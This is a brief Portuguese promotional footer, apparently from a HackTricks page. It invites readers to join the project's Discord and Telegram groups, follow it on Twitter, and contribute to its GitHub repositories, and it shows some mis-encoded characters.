* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
